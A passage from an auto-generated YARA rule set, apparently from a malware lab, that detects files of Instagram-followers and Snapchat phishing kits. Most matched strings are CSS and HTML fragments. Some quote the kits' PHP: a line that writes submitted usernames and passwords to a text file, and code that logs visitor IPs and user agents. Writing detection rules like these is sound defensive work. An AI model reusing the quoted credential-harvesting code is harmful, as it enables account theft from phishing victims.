      $s16 = "in this website. To login into insta followers pro you will need to " fullword ascii /* score: '15.00'*/
      $s17 = " If you aren't agree with our terms of uses you are not allow to login " fullword ascii /* score: '15.00'*/
      $s18 = "w.instafollowerspro.com/terms\" style=\"font-weight:bold; color: red;\">Terms of Use</a></p>" fullword ascii /* score: '14.00'*/
      $s19 = "   <!-- SITE SCRIPTS-->" fullword ascii /* score: '14.00'*/
      $s20 = "   <!-- VENDOR SCRIPTS-->" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      8 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_ip {
   meta:
      description = "phish__insta_followers - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__snapchat/phish__snapchat_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__snapchat
   Reference: phish__snapchat phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule flags_png {
   meta:
      description = "phish__snapchat - file flags.png.html"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5bd8e93561f0c13019bbad2e557186c895aad82e710082637e0797bc0826976b"
   strings:
      $x1 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"><html lang=\"en\"><hea" ascii /* score: '32.00'*/
      $s2 = "itial-scale=1.0\"><link rel=\"stylesheet\" href=\"https://accounts.snapchat.com/accounts/static/styles/404.css\"></head><body><d" ascii /* score: '21.00'*/
      $s3 = "src=\"https://accounts.snapchat.com/accounts/static/images/404.png\"/></body></html>" fullword ascii /* score: '20.00'*/
      $s4 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"><html lang=\"en\"><hea" ascii /* score: '18.00'*/
      $s5 = "a charset=\"utf-8\"><meta name=\"referrer\" content=\"origin\"><meta name=\"apple-itunes-app\" content=\"app-id=447188370\"><tit" ascii /* score: '9.00'*/
      $s6 = "ll; Snapchat</title><meta name=\"apple-mobile-web-app-capable\" content=\"no\"><meta name=\"viewport\" content=\"width=device-wi" ascii /* score: '8.00'*/
      $s7 = "ass=\"error-title\">Well, this is awkward!</div><div class=\"error-sub-title\">We couldn't find what you were looking for</div><" ascii /* score: '3.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule accounts {
   meta:
      description = "phish__snapchat - file accounts.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "dbdf8875250e2e453b94fc4bca6fe3e43dcdcc6684fb80946904e2e37042e5fb"
   strings:
      $s1 = ".accountsFormError {" fullword ascii /* score: '10.00'*/
      $s2 = ".accountsWideFormError {" fullword ascii /* score: '10.00'*/
      $s3 = ".DownloadMyData tr tr td {" fullword ascii /* score: '10.00'*/
      $s4 = "min-height: calc(100vh - 79px - 311px);" fullword ascii /* score: '8.00'*/
      $s5 = ".accountsNarrowButton.accountsButton-ru-ru {" fullword ascii /* score: '7.00'*/
      $s6 = ".accountsNarrowButton.accountsButton-pt-br {" fullword ascii /* score: '7.00'*/
      $s7 = ".accountsNarrowButton.accountsButton-de-de {" fullword ascii /* score: '7.00'*/
      $s8 = ".accountsWideButton {" fullword ascii /* score: '7.00'*/
      $s9 = ".accountsNarrowButton.accountsButton-fi-fi {" fullword ascii /* score: '7.00'*/
      $s10 = ".accountsNarrowButton.accountsButton-nl-nl {" fullword ascii /* score: '7.00'*/
      $s11 = "padding-bottom: 5rem !important;" fullword ascii /* score: '7.00'*/
      $s12 = "margin-left: auto !important;" fullword ascii /* score: '7.00'*/
      $s13 = ".accountsText {" fullword ascii /* score: '7.00'*/
      $s14 = ".accountsNarrowField {" fullword ascii /* score: '7.00'*/
      $s15 = ".accountsCentered {" fullword ascii /* score: '7.00'*/
      $s16 = ".accountsNarrowButton {" fullword ascii /* score: '7.00'*/
      $s17 = ".accountsNarrowButton.accountsButton-ro-ro {" fullword ascii /* score: '7.00'*/
      $s18 = ".accountsBody {" fullword ascii /* score: '7.00'*/
      $s19 = ".accountsTitle {" fullword ascii /* score: '7.00'*/
      $s20 = ".accountsNarrowButton.accountsButton-it-it {" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x612e and filesize < 5KB and
      8 of them
}

rule snapchat {
   meta:
      description = "phish__snapchat - file snapchat.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "494b8167faba431c364dc43257d6e60ccf8490803bf03648198454fdadaec8f2"
   strings:
      $s1 = ".snapchatHeader .logo {" fullword ascii /* score: '18.00'*/
      $s2 = ".snapchatInvertedHeader h1 .logo {" fullword ascii /* score: '18.00'*/
      $s3 = ".snapchatInvertedHeader h1 {" fullword ascii /* score: '9.00'*/
      $s4 = ".ui.snapchatHeader.stackable.grid .column {" fullword ascii /* score: '9.00'*/
      $s5 = "padding-bottom: 5rem !important;" fullword ascii /* score: '7.00'*/
      $s6 = "margin-top: 2rem !important;" fullword ascii /* score: '7.00'*/
      $s7 = "padding-top: 1rem !important;" fullword ascii /* score: '7.00'*/
      $s8 = "  font-family: 'Dropdown';" fullword ascii /* score: '6.00'*/
      $s9 = "margin-bottom: 1rem;" fullword ascii /* score: '4.00'*/
      $s10 = "width: 75%;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "  font-weight: normal;" fullword ascii /* score: '4.00'*/
      $s12 = ".snapchatFooter.stackable.grid {" fullword ascii /* score: '4.00'*/
      $s13 = "  font-style: normal;" fullword ascii /* score: '4.00'*/
      $s14 = "#navigationMenuButton img {" fullword ascii /* score: '4.00'*/
      $s15 = ".snapchatFooter .column {" fullword ascii /* score: '4.00'*/
      $s16 = "width: 36px;" fullword ascii /* score: '4.00'*/
      $s17 = "padding: 1rem;" fullword ascii /* score: '4.00'*/
      $s18 = ".snapchatFooter.stackable.grid h5 {" fullword ascii /* score: '4.00'*/
      $s19 = "max-width: 240px;" fullword ascii /* score: '4.00'*/
      $s20 = ".snapchatBody.stackable.grid {" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x732e and filesize < 3KB and
      8 of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_accounts_static_styles_revoke {
   meta:
      description = "phish__snapchat - file revoke.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "55afb4e61527076483c1929a24971b27b8b366fbc5b72f85b96b051a97c1a263"
   strings:
      $s1 = "    background-clip: padding-box; /* for IE9+, Firefox 4+, Opera, Chrome */" fullword ascii /* score: '8.00'*/
      $s2 = "-ms-transform: translateY(-50%); /* IE 9 */" fullword ascii /* score: '8.00'*/
      $s3 = ".authAppItem .authAppMessageField {" fullword ascii /* score: '7.00'*/
      $s4 = ".authAppItem h3, .authAppItem p {" fullword ascii /* score: '7.00'*/
      $s5 = ".authAppsBody .authText {" fullword ascii /* score: '7.00'*/
      $s6 = ".authAppItem {" fullword ascii /* score: '7.00'*/
      $s7 = "    -webkit-transform: translateY(-50%); /* Safari */" fullword ascii /* score: '7.00'*/
      $s8 = "padding-bottom: 5rem!important;" fullword ascii /* score: '7.00'*/
      $s9 = ".authAppsBody .authSubTitle {" fullword ascii /* score: '7.00'*/
      $s10 = ".authAppItem .ui.button.revokeButton:hover {" fullword ascii /* score: '7.00'*/
      $s11 = ".authAppItem .ui.button.revokeButton {" fullword ascii /* score: '7.00'*/
      $s12 = "color: #262626!important;" fullword ascii /* score: '7.00'*/
      $s13 = "    -webkit-background-clip: padding-box; /* for Safari */" fullword ascii /* score: '7.00'*/
      $s14 = ".authAppsBody {" fullword ascii /* score: '7.00'*/
      $s15 = "width: 75%;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "background-color: #fffc01;" fullword ascii /* score: '4.00'*/
      $s17 = "margin-top: 16px;" fullword ascii /* score: '4.00'*/
      $s18 = "max-width: 500px;" fullword ascii /* score: '4.00'*/
      $s19 = "transform: translateY(-50%);" fullword ascii /* score: '4.00'*/
      $s20 = "border-top: 1px solid rgb(255, 255, 255);" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x612e and filesize < 3KB and
      8 of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_accounts_static_styles_auth {
   meta:
      description = "phish__snapchat - file auth.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "87e50f229ef7329e90030981164f7f23dcab7a28527937ea3b15e562ee69e42f"
   strings:
      $s1 = "content: \" \"; " fullword ascii /* score: '9.00'*/
      $s2 = "    background-clip: padding-box; /* for IE9+, Firefox 4+, Opera, Chrome */" fullword ascii /* score: '8.00'*/
      $s3 = "padding-bottom: 5rem!important;" fullword ascii /* score: '7.00'*/
      $s4 = "color: #262626!important;" fullword ascii /* score: '7.00'*/
      $s5 = "    -webkit-background-clip: padding-box; /* for Safari */" fullword ascii /* score: '7.00'*/
      $s6 = ".authCentered {" fullword ascii /* score: '7.00'*/
      $s7 = ".authField {" fullword ascii /* score: '7.00'*/
      $s8 = ".authSmallMarginTop {" fullword ascii /* score: '7.00'*/
      $s9 = ".authBody {" fullword ascii /* score: '7.00'*/
      $s10 = "margin-top: 1rem!important;" fullword ascii /* score: '7.00'*/
      $s11 = ".authClearfix::before, .authClearfix::after {" fullword ascii /* score: '7.00'*/
      $s12 = ".authField.lastField {" fullword ascii /* score: '7.00'*/
      $s13 = ".authFieldMessage {" fullword ascii /* score: '7.00'*/
      $s14 = ".authField.firstField {" fullword ascii /* score: '7.00'*/
      $s15 = ".authButton.authSecondaryButton:hover {" fullword ascii /* score: '7.00'*/
      $s16 = ".authClearfix::after {" fullword ascii /* score: '7.00'*/
      $s17 = ".authText, .authWideInput, .authField {" fullword ascii /* score: '7.00'*/
      $s18 = ".authButton.authSecondaryButton {" fullword ascii /* score: '7.00'*/
      $s19 = ".authSubTitle {" fullword ascii /* score: '7.00'*/
      $s20 = ".authFieldIcon {" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x612e and filesize < 4KB and
      8 of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_login {
   meta:
      description = "phish__snapchat - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "258d9e4ddb5c006c4ffd3613ecebfce7b29601db66a02d33b30571f388832462"
   strings:
      $x1 = "}</style><style type=\"text/css\">:root a[href^=\"http://ad-apac.doubleclick.net/\"], :root .GKJYXHBF2 > .GKJYXHBE2 > .GKJYXHBH5" ascii /* score: '69.00'*/
      $x2 = "    </style><div class=\"cookie-icon cookie-icon-left\" style=\"position: absolute; width: 240px; height: 120px; background: url" ascii /* score: '48.00'*/
      $x3 = "lesdownloader.com/\"], :root a[href^=\"http://www.quick-torrent.com/download.html?aff\"], :root a[href^=\"http://mo8mwxi1.com/\"" ascii /* score: '38.00'*/
      $x4 = "mhill.com/redirect.aspx?\"], :root a[href^=\"http://adserver.adtech.de/\"], :root a[href^=\"http://www.1clickdownloader.com/\"]," ascii /* score: '38.00'*/
      $x5 = " Snapchat</title><!-- Meta --><meta charset=\"utf-8\"><meta name=\"referrer\" content=\"origin\"><meta name=\"apple-mobile-web-a" ascii /* score: '35.00'*/
      $x6 = "://www.sfippa.com/\"], :root a[href^=\"http://www.socialsex.com/\"], :root a[href^=\"http://www.torntv-downloader.com/\"], :root" ascii /* score: '35.00'*/
      $x7 = "down^=\"this.href='http://paid.outbrain.com/network/redir?\"][target=\"_blank\"] + .ob_source, :root a[onmousedown^=\"this.href=" ascii /* score: '34.00'*/
      $x8 = "net.com/i/\"], :root a[href^=\"http://www1.clickdownloader.com/\"], :root a[href^=\"http://www5.smartadserver.com/call/pubjumpi/" ascii /* score: '34.00'*/
      $x9 = "\"this.href='http://staffpicks.outbrain.com/network/redir?\"][target=\"_blank\"] + .ob_source, :root a[href^=\"http://games.ucoz" ascii /* score: '34.00'*/
      $x10 = "class^=\"ads-partner-\"], :root #\\5f _mom_ad_12, :root a[href^=\"http://lp.ncdownloader.com/\"], :root .inlineNewsletterSubscri" ascii /* score: '34.00'*/
      $x11 = "=\"], :root a[onmousedown^=\"this.href='https://paid.outbrain.com/network/redir?\"][target=\"_blank\"] + .ob_source, :root a[hre" ascii /* score: '34.00'*/
      $x12 = "ord</a><!-- react-text: 27 --> / <!-- /react-text --><a href=\"https://accounts.snapchat.com/accounts/signup\">CREATE ACCOUNT</a" ascii /* score: '33.00'*/
      $x13 = "http://lp.ezdownloadpro.info/\"], :root a[data-widget-outbrain-redirect^=\"http://paid.outbrain.com/network/redir?\"], :root a[h" ascii /* score: '31.00'*/
      $s14 = "ef^=\"http://www.myvpn.pro/\"], :root a[onmousedown^=\"this.href='http://paid.outbrain.com/network/redir?\"][target=\"_blank\"]," ascii /* score: '30.00'*/
      $s15 = "\"], :root a[href^=\"http://clk.directrev.com/\"], :root a[href^=\"http://galleries.pinballpublishernetwork.com/\"], :root a[tar" ascii /* score: '30.00'*/
      $s16 = "in-height:250px\"][href^=\"http://li.cnet.com/click?\"], :root a[target=\"_blank\"][onmousedown=\"this.href^='http://paid.outbra" ascii /* score: '30.00'*/
      $s17 = "r.com/?AFF_ID=\"], :root a[onmousedown^=\"this.href='http://staffpicks.outbrain.com/network/redir?\"][target=\"_blank\"], :root " ascii /* score: '30.00'*/
      $s18 = "link rel=\"stylesheet\" href=\"/accounts/static/styles/revoke.css\"><!-- Scripts --><script src=\"/accounts/static/scripts/jquer" ascii /* score: '29.00'*/
      $s19 = "xtgem.com/click?\"], :root a[href*=\"=Adtracker\"], :root a[href^=\"http://www.downloadweb.org/\"], :root a[href*=\"ad2upapp.com" ascii /* score: '29.00'*/
      $s20 = "kssolutions.com/\"], :root a[href^=\"http://www.easydownloadnow.com/\"], :root a[href^=\"http://www.epicgameads.com/\"], :root a" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule dropdown_min {
   meta:
      description = "phish__snapchat - file dropdown.min.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "cb90820edef6ff76150e4795a54491ed695f5621a9fc5e13284f9b3c11efde32"
   strings:
      $x1 = " */.ui.dropdown{cursor:pointer;position:relative;display:inline-block;outline:0;text-align:left;-webkit-transition:box-shadow .1" ascii /* score: '51.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '' */ /* score: '26.50'*/
      $s3 = " * http://github.com/semantic-org/semantic-ui/" fullword ascii /* score: '21.00'*/
      $s4 = "AG8AbQBvAG8Abmljb21vb24AaQBjAG8AbQBvAG8AbgBSAGUAZwB1AGwAYQByAGkAYwBvAG0AbwBvAG4ARgBvAG4AdAAgAGcAZQBuAGUAcgBhAHQAZQBkACAAYgB5ACAA" ascii /* base64 encoded string 'omoonicomoonicomoonRegularicomoonFont generated by ' */ /* score: '17.00'*/
      $s5 = "ALgAwAGkAYwBvAG0AbwBvAG5pY29tb29uAGkAYwBvAG0AbwBvAG4AUgBlAGcAdQBsAGEAcgBpAGMAbwBtAG8AbwBuAEYAbwBuAHQAIABnAGUAbgBlAHIAYQB0AGUAZAA" ascii /* base64 encoded string '.0icomoonicomoonicomoonRegularicomoonFont generated' */ /* score: '17.00'*/
      $s6 = "AAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '0' */ /* score: '16.50'*/
      $s7 = " .menu{box-shadow:0 -2px 3px 0 rgba(0,0,0,.08)}.ui.dropdown .scrolling.menu,.ui.scrolling.dropdown .menu{overflow-x:hidden;overf" ascii /* score: '14.00'*/
      $s8 = " * # Semantic UI 2.1.7 - Dropdown" fullword ascii /* score: '14.00'*/
      $s9 = "mage.floated,.ui.dropdown .menu .item>img.floated{margin-top:0}.ui.dropdown .menu>.header{margin:1rem 0 .75rem;padding:0 1.14285" ascii /* score: '14.00'*/
      $s10 = " * http://opensource.org/licenses/MIT" fullword ascii /* score: '14.00'*/
      $s11 = "n>i.icon:before{top:0!important;left:0!important}.ui.loading.dropdown>i.icon:before{position:absolute;content:'';top:50%;left:50" ascii /* score: '14.00'*/
      $s12 = ".dropdown .menu{min-width:calc(100% - 17px)}}@media only screen and (max-width:767px){.ui.dropdown .scrolling.menu,.ui.scrolling" ascii /* score: '14.00'*/
      $s13 = "-top-width:1px!important;border-bottom-width:0!important;box-shadow:0 -2px 3px 0 rgba(0,0,0,.08)}.ui.upward.selection.dropdown:h" ascii /* score: '13.00'*/
      $s14 = "0,0,.4)}.ui.dropdown .menu .menu{top:0!important;left:100%!important;right:auto!important;margin:0 0 0 -.5em!important;border-ra" ascii /* score: '13.00'*/
      $s15 = "width:auto!important;border-top:1px solid rgba(34,36,38,.15)}.ui.dropdown .scrolling.menu>.item.item.item,.ui.scrolling.dropdown" ascii /* score: '13.00'*/
      $s16 = " .menu .item.item.item{border-top:none;padding-right:calc(1.14285714rem + 17px)!important}.ui.dropdown .scrolling.menu .item:fir" ascii /* score: '13.00'*/
      $s17 = ":hidden;-webkit-overflow-scrolling:touch;min-width:100%!important;width:auto!important}.ui.dropdown .scrolling.menu{position:sta" ascii /* score: '13.00'*/
      $s18 = "item .dropdown.icon:before{content:\"\\f0d9\"}.ui.vertical.menu .dropdown.item>.dropdown.icon:before{content:\"\\f0da\"}" fullword ascii /* score: '13.00'*/
      $s19 = "1em;opacity:.8;-webkit-transition:opacity .1s ease;transition:opacity .1s ease}.ui.compact.selection.dropdown{min-width:0}.ui.se" ascii /* score: '13.00'*/
      $s20 = "own .filtered.item{display:none!important}.ui.dropdown.error,.ui.dropdown.error>.default.text,.ui.dropdown.error>.text{color:#9F" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule semantic_min {
   meta:
      description = "phish__snapchat - file semantic.min.css"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1081ac22f6016a281599972a28e64518ab215ed56877fb473205f575e16cf2c7"
   strings:
      $x1 = "*,:after,:before{box-sizing:inherit}html{box-sizing:border-box;font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-siz" ascii /* score: '74.00'*/
      $x2 = "';left:-1em;height:100%;vertical-align:baseline}.ui.message ul.list li:last-child{margin-bottom:0}.ui.message>.icon{margin-right" ascii /* score: '56.00'*/
      $x3 = "';opacity:1;color:rgba(0,0,0,.8);vertical-align:top}.ui.bulleted.list .list,ul.ui.list ul{padding-left:1rem}.ui.horizontal.bulle" ascii /* score: '53.00'*/
      $s4 = "}i.icon.subscript:before{content:\"\\f12c\"}i.icon.header:before{content:\"\\f1dc\"}i.icon.paragraph:before{content:\"\\f1dd\"}i" ascii /* score: '29.00'*/
      $s5 = "before{content:\"\\f14b\"}i.icon.compass:before{content:\"\\f14e\"}i.icon.eur:before{content:\"\\f153\"}i.icon.gbp:before{conten" ascii /* score: '28.00'*/
      $s6 = "\\f0fc\"}i.icon.plus.square:before{content:\"\\f0fe\"}i.icon.computer:before{content:\"\\f108\"}i.icon.asexual:before,i.icon.cir" ascii /* score: '28.00'*/
      $s7 = "e{content:\"\\f088\"}i.icon.heart.outline:before{content:\"\\f08a\"}i.icon.log.out:before{content:\"\\f08b\"}i.icon.thumb.tack:b" ascii /* score: '27.00'*/
      $s8 = "n.add.user:before{content:\"\\f234\"}i.icon.remove.user:before{content:\"\\f235\"}i.icon.help.circle:before{content:\"\\f059\"}i" ascii /* score: '26.00'*/
      $s9 = "con.rocket:before{content:\"\\f135\"}i.icon.anchor:before{content:\"\\f13d\"}i.icon.bullseye:before{content:\"\\f140\"}i.icon.su" ascii /* score: '26.00'*/
      $s10 = "con.add.circle:before{content:\"\\f055\"}i.icon.remove.circle:before{content:\"\\f057\"}i.icon.check.circle:before{content:\"\\f" ascii /* score: '26.00'*/
      $s11 = "ing:0!important;width:-webkit-calc(100% - 2em)!important;width:calc(100% - 2em)!important}}.ui.cards>.card{font-size:1em}.ui.com" ascii /* score: '25.00'*/
      $s12 = "ield:before{content:\"\\f132\"}i.icon.target:before{content:\"\\f140\"}i.icon.play.circle:before{content:\"\\f144\"}i.icon.penci" ascii /* score: '25.00'*/
      $s13 = "\"\\f05e\"}i.icon.mail.forward:before,i.icon.share:before{content:\"\\f064\"}i.icon.expand:before{content:\"\\f065\"}i.icon.comp" ascii /* score: '25.00'*/
      $s14 = "int.brush:before{content:\"\\f1fc\"}i.icon.heartbeat:before{content:\"\\f21e\"}i.icon.download:before{content:\"\\f019\"}i.icon." ascii /* score: '24.00'*/
      $s15 = "con.woman:before{content:\"\\f221\"}i.icon.man:before{content:\"\\f222\"}i.icon.non.binary.transgender:before{content:\"\\f223\"" ascii /* score: '24.00'*/
      $s16 = "s;transition-delay:.1s}.ui.minimal.comments .comment>.content:hover>.actions{opacity:1}.ui.small.comments{font-size:.9em}.ui.com" ascii /* score: '23.00'*/
      $s17 = "re{content:\"\\f187\"}i.icon.dot.circle.outline:before{content:\"\\f192\"}i.icon.sliders:before{content:\"\\f1de\"}i.icon.wi-fi:" ascii /* score: '23.00'*/
      $s18 = "t.square:before{content:\"\\f1a2\"}i.icon.stumbleupon.circle:before{content:\"\\f1a3\"}i.icon.stumbleupon:before{content:\"\\f1a" ascii /* score: '23.00'*/
      $s19 = "con.remove.circle.outline:before{content:\"\\f05c\"}i.icon.check.circle.outline:before{content:\"\\f05d\"}i.icon.plus:before{con" ascii /* score: '23.00'*/
      $s20 = "re{content:\"\\f19d\"}i.icon.spy:before{content:\"\\f21b\"}i.icon.female:before{content:\"\\f182\"}i.icon.male:before{content:\"" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2f20 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_accounts_static_scripts_main {
   meta:
      description = "phish__snapchat - file main.js"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0f17300e4a9c90544ecc30f37a83d3a972102ae034ad625833a7a96740397cc3"
   strings:
      $x1 = "!function(n,i){a=[],r=i,void 0!==(o=\"function\"==typeof r?r.apply(t,a):r)&&(e.exports=o)}(0,function(){\"use strict\";function " ascii /* score: '86.00'*/
      $x2 = "\",n))),l.a.createElement(f.Col,{xs:12,md:5},l.a.createElement(\"div\",{className:\"sign-up-success-container-device\"},l.a.crea" ascii /* score: '81.00'*/
      $x3 = "lectionner l'heure\"};t.default=r,e.exports=t.default},function(e,t,n){\"use strict\";function r(e){return e&&e.__esModule?e:{de" ascii /* score: '80.00'*/
      $x4 = "\",b.a.createElement(\"a\",{href:\"/accounts/login\"+window.location.search,onClick:n.switchToLogInPage},\"Log In\"));default:re" ascii /* score: '78.00'*/
      $x5 = "ve requested your data and haven't received it yet, please wait until you've downloaded your data to delete your account. We won" ascii /* score: '77.00'*/
      $x6 = "\"}})})},function(e,t,n){\"use strict\";n.d(t,\"a\",function(){return r});var r;!function(e){e[e.NONE=-1]=\"NONE\",e[e.PRIMARY=0" ascii /* score: '75.50'*/
      $x7 = "var a=Object.getOwnPropertySymbols,o=Object.prototype.hasOwnProperty,i=Object.prototype.propertyIsEnumerable;e.exports=function(" ascii /* score: '75.00'*/
      $x8 = "cle suivant\"},e.exports=t.default},function(e,t,n){\"use strict\";Object.defineProperty(t,\"__esModule\",{value:!0});var r=n(99" ascii /* score: '73.00'*/
      $x9 = "\",u.a.createElement(\"a\",{target:\"_blank\",rel:\"noopener noreferrer\",href:\"https://www.snap.com/privacy/privacy-policy/\"}" ascii /* score: '73.00'*/
      $x10 = "function r(e,t){if(!i.default.canUseDOM||t&&!(\"addEventListener\"in document))return!1;var n=\"on\"+e,r=n in document;if(!r){va" ascii /* score: '73.00'*/
      $x11 = "!function(){\"use strict\";function n(){for(var e=[],t=0;t<arguments.length;t++){var r=arguments[t];if(r){var a=typeof r;if(\"st" ascii /* score: '69.00'*/
      $x12 = "\"]]),a=(t.DEFAULT_AVAILABLE_LOCALES=[\"da-DK\",\"de-DE\",\"en-US\",\"en-GB\",\"es\",\"fr-FR\",\"it-IT\",\"ja-JP\",\"nl-NL\",\"n" ascii /* score: '69.00'*/
      $x13 = "function r(e,t){if(!o.canUseDOM||t&&!(\"addEventListener\"in document))return!1;var n=\"on\"+e,r=n in document;if(!r){var i=docu" ascii /* score: '66.50'*/
      $x14 = " \",\" Bitmoji \"))))),l.a.createElement(\"div\",{className:\"sixteen wide column\",style:s},l.a.createElement(\"div\",{classNam" ascii /* score: '66.00'*/
      $x15 = "\"))},this.getInputDOMNode=function(){return e.topCtrlRef?e.topCtrlRef.querySelector(\"input,textarea,div[contentEditable]\"):e." ascii /* score: '65.00'*/
      $x16 = "var i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var n in t)t.hasOwn" ascii /* score: '65.00'*/
      $x17 = "for(o=97;o<123;o++)r[String.fromCharCode(o)]=o-32;for(var o=48;o<58;o++)r[o-48]=o;for(o=1;o<13;o++)r[\"f\"+o]=o+111;for(o=0;o<10" ascii /* score: '63.00'*/
      $x18 = "!function(n,i){a=[t,e],r=i,void 0!==(o=\"function\"==typeof r?r.apply(t,a):r)&&(e.exports=o)}(0,function(e,t){\"use strict\";fun" ascii /* score: '63.00'*/
      $x19 = "\"use strict\";function n(e){if(null===e||void 0===e)throw new TypeError(\"Object.assign cannot be called with null or undefined" ascii /* score: '62.50'*/
      $x20 = "\"},\" \")]}},{key:\"renderSearchingState\",value:function(){return D.default.createElement(\"div\",null,D.default.createElement" ascii /* score: '62.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 12000KB and
      1 of ($x*)
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_index {
   meta:
      description = "phish__snapchat - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_login_2 {
   meta:
      description = "phish__snapchat - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "64efc8e483d1d8e59f7e69bd0d6446970e8d1006ddb329b9d07c1460d300071a"
   strings:
      $s1 = "header('Location: https://accounts.snapchat.com/accounts/login');" fullword ascii /* score: '29.00'*/
      $s2 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__snapchat_home_ubuntu_malware_lab_samples_extracted_phishing_Snapchat_ip {
   meta:
      description = "phish__snapchat - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__snapchat phishing_kit auto gen"
      date = "2026-02-27"
